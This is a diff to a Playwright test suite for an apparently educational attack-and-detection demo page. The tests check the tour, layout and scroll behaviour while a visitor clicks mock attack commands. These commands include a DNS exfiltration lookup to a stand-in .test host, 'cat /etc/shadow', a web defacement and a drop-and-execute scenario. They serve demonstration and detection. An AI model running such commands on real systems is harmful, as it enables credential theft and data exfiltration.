@@ -263,16 +263,23 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
   test("the tour advances through its steps from what the visitor really did (mock)", async ({ page, isMobile }) => {
     const problems = guardConsole(page);
     await page.goto("/?mock=1&mock-speed=0.3");
-    const tour = page.locator("#tour .tour");
+    const bar = page.locator("#tour .tour");
+    // The steps: in the panel beside the terminal, or (a phone) below it once the bar's toggle opens them.
+    const tour = page.locator("#tour-steps");
     await expect(tour.locator(".tour__step")).toHaveCount(6);
-    await expect(tour.locator(".tour__count")).toContainText("Step 1 of 6");
-    await expect(tour.locator(".tour__count")).toContainText("uses two of your runs");
+    await expect(bar.locator(".tour__count")).toContainText("Step 1 of 6");
     // On a phone the tour is a folded bar above the terminal: the steps open on its toggle.
     if (isMobile) {
-      await expect(tour).toHaveAttribute("data-layout", "bar");
-      await expect(tour.locator(".tour__barstep .tour__bartitle")).toHaveText("Look around");
-      await tour.getByRole("button", { name: "Show the steps" }).click();
-    } else await expect(tour).toHaveAttribute("data-layout", "side");
+      await expect(bar).toHaveAttribute("data-layout", "bar");
+      await expect(bar.locator(".tour__barstep .tour__bartitle")).toHaveText("Look around");
+      await expect(tour).toBeHidden();
+      await bar.getByRole("button", { name: "Show the steps" }).click();
+      await expect(tour).toBeVisible();
+      expect(await tour.evaluate((el) => el.closest("#tour-below") !== null)).toBe(true);
+    } else {
+      await expect(bar).toHaveAttribute("data-layout", "side");
+      await expect(bar.locator(".tour__count")).toContainText("uses two of your runs");
+    }
     await expect(tour.locator('.tour__step[data-current="true"] .tour__title')).toHaveText("Look around");
     // Step 1's button opens the terminal with `id` picked; Enter runs it and the step ticks.
     await tour.locator('.tour__step[data-current="true"] .tour__btn').click();
@@ -281,7 +288,7 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await term.locator("#term-input").press("Enter");
     await expect(term.locator(".term__out")).toContainText("uid=10001");
     await expect(tour.locator('.tour__step[data-done="true"]')).toHaveCount(1);
-    await expect(tour.locator(".tour__count")).toContainText("Step 2 of 6");
+    await expect(bar.locator(".tour__count")).toContainText("Step 2 of 6");
     // Step 2 needs both the deface and the flag.
     await term.getByRole("button", { name: /^echo pwned>/ }).click();
     await expect(term.locator(".term__shop .browser")).toHaveAttribute("data-status", "defaced");
@@ -296,7 +303,7 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(tour.locator('.tour__step[data-id="caught"]')).toHaveAttribute("data-done", "true");
     await expect(tour.locator('.tour__step[data-done="true"]')).toHaveCount(3);
     await expect(tour.locator('.tour__step[data-current="true"] .tour__title')).toHaveText("Hide it in DNS");
-    await expect(tour.locator(".tour__count")).toContainText("Step 3 of 6");
+    await expect(bar.locator(".tour__count")).toContainText("Step 3 of 6");
     // The done step offers its way to the kill timeline; the notices name the detection and the answer.
     await expect(tour.locator('.tour__step[data-id="caught"]').getByRole("button", { name: "Watch the kill timeline" })).toBeVisible();
     await expect(tour.locator(".tour__notice--falco")).toContainText(/^Falco detected: .+ at \d\d:\d\d:\d\d CES?T\.$/);
@@ -305,12 +312,14 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(page.locator("#diagram-status")).toContainText(/answered/);
     await expect(page.locator("#diagram-status")).toContainText("detected: Falco");
     // Skipping hides the tour and is remembered; showing it brings the progress back (derived, not stored).
-    await tour.getByRole("button", { name: "Skip the tour" }).click();
+    await (isMobile ? tour : bar).getByRole("button", { name: "Skip the tour" }).click();
     await expect(page.locator("#tour .tour--skipped")).toBeVisible();
+    // The notices stay with a hidden tour (beside the terminal on a desktop).
+    if (!isMobile) await expect(page.locator("#tour .tour--skipped .tour__notice--talon")).toHaveCount(1);
     await page.reload();
     await expect(page.locator("#tour .tour--skipped")).toBeVisible();
     await page.locator("#tour .tour--skipped .tour__btn").click();
-    await expect(page.locator("#tour .tour__step")).toHaveCount(6);
+    await expect(page.locator("#tour-steps .tour__step")).toHaveCount(6);
     expect(problems).toEqual([]);
   });
 
@@ -318,13 +327,16 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     test.setTimeout(60_000);
     const problems = guardConsole(page);
     await page.setViewportSize(isMobile ? { width: 390, height: 844 } : { width: 1440, height: 900 });
-    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=3000");
-    const tour = page.locator("#tour .tour");
+    // The SIEM files 9 s after the command (30 s at this speed): well past the page's settling window,
+    // as live (1-3 min), so the phone's toast is for news and not for what a load lists.
+    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=30000");
+    const bar = page.locator("#tour .tour");
+    const tour = page.locator("#tour-steps");
     const term = page.locator("#terminal");
     // The visitor goes to the attack section themselves.
     await page.evaluate(() => document.getElementById("attack")?.scrollIntoView({ behavior: "instant" }));
     await page.waitForTimeout(200);
-    if (isMobile) await tour.getByRole("button", { name: "Show the steps" }).click();
+    if (isMobile) await bar.getByRole("button", { name: "Show the steps" }).click();
     // A click is the visitor's (Playwright scrolls a target into view to press it): scrollY is read
     // right after each press, and must not change while the page answers.
     const y = () => page.evaluate(() => scrollY);
@@ -339,21 +351,21 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
     expect(await y()).toBe(y0);
     // The DNS exfil: the step ticks, the SIEM files its incident a moment later - a notice, not a jump.
-    // On a phone the output and the "This run" rows sit above the chips, and the browser's scroll
-    // anchoring keeps the chips the visitor pressed where they are as those grow: what must hold
-    // there is that the chips do not move; on a desktop the number itself.
-    const chipTop = () => term.locator(".term__chips").evaluate((el) => Math.round(el.getBoundingClientRect().top));
+    // On a phone the output and the "This run" rows sit above the chips the visitor presses, and the
+    // browser's scroll anchoring moves scrollY to keep those chips still as the output grows: what must
+    // hold there is the terminal's place in the document; on a desktop the number itself too.
+    const termTop = () => term.evaluate((el) => Math.round(el.getBoundingClientRect().top + scrollY));
     const still = async (y: number, c: number) => {
-      if (isMobile) expect(Math.abs((await chipTop()) - c)).toBeLessThanOrEqual(2);
-      else expect(await page.evaluate(() => scrollY)).toBe(y);
+      expect(await termTop()).toBe(c);
+      if (!isMobile) expect(await page.evaluate(() => scrollY)).toBe(y);
     };
     await term.getByRole("button", { name: "nslookup sdp-<flag>.x.exfil.sdp.test." }).click();
     y0 = await y();
-    let c0 = await chipTop();
+    let c0 = await termTop();
     await expect(tour.locator('.tour__step[data-id="hide"]')).toHaveAttribute("data-done", "true");
     const siem = tour.locator(".tour__notice--siem");
-    await expect(siem).toHaveCount(1, { timeout: 20_000 });
-    await expect(siem.locator(".tour__ntext")).toHaveText(/^The SIEM caught your DNS exfiltration — incident filed at \d\d:\d\d:\d\d CES?T\.$/);
+    await expect(siem).toHaveCount(1, { timeout: 25_000 });
+    await expect(siem.locator(".tour__ntext")).toHaveText(/^The SIEM caught your DNS exfiltration from \d\d:\d\d:\d\d CES?T\.$/);
     await expect(siem.getByRole("link", { name: "Show in SIEM" })).toHaveAttribute("href", /^#incident-[0-9a-f]{16}$/);
     await expect(tour.locator('.tour__step[data-id="siem"]')).toHaveAttribute("data-done", "true");
     await still(y0, c0);
@@ -371,11 +383,15 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
       if ((await toast.getAttribute("class"))?.includes("tour-toast")) await expect(toast).toHaveAttribute("role", "status");
       await toast.getByRole("button", { name: /Dismiss/ }).click();
       await expect(toast).toBeHidden();
+      // The bar above the terminal has kept its height through all of it; the opened steps and the
+      // notices are below the terminal.
+      expect(await termTop()).toBe(c0);
+      await expect(page.locator("#tour-below #tour-steps .tour__notice--siem")).toHaveCount(1);
     } else await expect(page.locator(".tour-toast")).toHaveCount(0);
     // Getting caught: Falco's alert and Talon's answer are notices too, and the summary does not pull the page.
     await term.getByRole("button", { name: "cat /etc/shadow" }).click();
     y0 = await y();
-    c0 = await chipTop();
+    c0 = await termTop();
     await expect(term.locator(".term__summary")).toBeVisible({ timeout: 15_000 });
     await expect(tour.locator(".tour__notice--talon")).toHaveCount(1);
     await expect(tour.locator(".tour__notice--falco")).toHaveCount(1);
@@ -761,14 +777,13 @@ test.describe("live run console (mock)", () => {
     await expect(page.locator("#console .console__scenario")).toHaveText("Read /etc/shadow");
   });
 
-  test("launching does not move the page: the status line links to the live run, and that link takes the visitor there", async ({ page, isMobile }) => {
+  test("launching does not move the page: the status line links to the live run, and that link takes the visitor there", async ({ page }) => {
     await page.goto("/?mock=1");
     const button = page.locator('.scenario[data-scenario="drop-and-execute"] .btn--attack');
     // The press is the visitor's (Playwright scrolls the button into view to press it): scrollY is
-    // read right after it, and must not change while the run starts and the console fills. On a
-    // phone the status line's three lines grow above the console, and the browser's scroll anchoring
-    // keeps the pressed button where it is: that is what must hold there.
-    const top = () => button.evaluate((el) => Math.round(el.getBoundingClientRect().top));
+    // read right after it, and must not change while the run starts and the console fills; nor may
+    // the launcher's place in the document, which is what the browser's scroll anchoring would hide.
+    const top = () => page.locator("#scenario-panel").evaluate((el) => Math.round(el.getBoundingClientRect().top + scrollY));
     await button.click();
     const before = await page.evaluate(() => scrollY);
     const t0 = await top();
@@ -776,8 +791,8 @@ test.describe("live run console (mock)", () => {
     await expect(link).toHaveText("live run below ↓");
     await expect(page.locator("#console .console__run")).toHaveCount(1);
     await page.waitForTimeout(300);
-    if (isMobile) expect(Math.abs((await top()) - t0)).toBeLessThanOrEqual(2);
-    else expect(await page.evaluate(() => scrollY)).toBe(before);
+    expect(await top()).toBe(t0);
+    expect(await page.evaluate(() => scrollY)).toBe(before);
     await link.click();
     await expect(page.locator("#console-title")).toBeInViewport();
     await noHorizontalScroll(page);
@@ -853,12 +868,12 @@ test.describe("attacker's terminal (mock, ADR 0033)", () => {
           const v = li.querySelector(".deflayer__verdict")!.getBoundingClientRect();
           return { codeTop: c.top, codeRight: c.right, verdictTop: v.top, verdictLeft: v.left };
         });
-        return { rights: badges.map((b) => Math.round(b.right)), lefts: badges.map((b) => Math.round(b.left)), widths: verdicts.map((b) => Math.round(b.width)), right: box.right, rows };
+        return { rights: badges.map((b) => Math.round(b.right)), lefts: badges.map((b) => Math.round(b.left)), verdictLefts: verdicts.map((b) => Math.round(b.left)), right: box.right, rows };
       });
       expect(m.lefts.length).toBeGreaterThanOrEqual(m.rows.length);
-      // One column: every badge shares one right edge, the verdicts one width.
+      // One column: every badge shares one right edge, the verdicts one left edge.
       expect(new Set(m.rights).size).toBe(1);
-      expect(new Set(m.widths).size).toBe(1);
+      expect(new Set(m.verdictLefts).size).toBe(1);
       expect(m.rights[0]).toBeLessThanOrEqual(Math.round(m.right) + 1);
       for (const r of m.rows) {
         // A command never runs under its badge, however long it is; the badge sits on its first line.
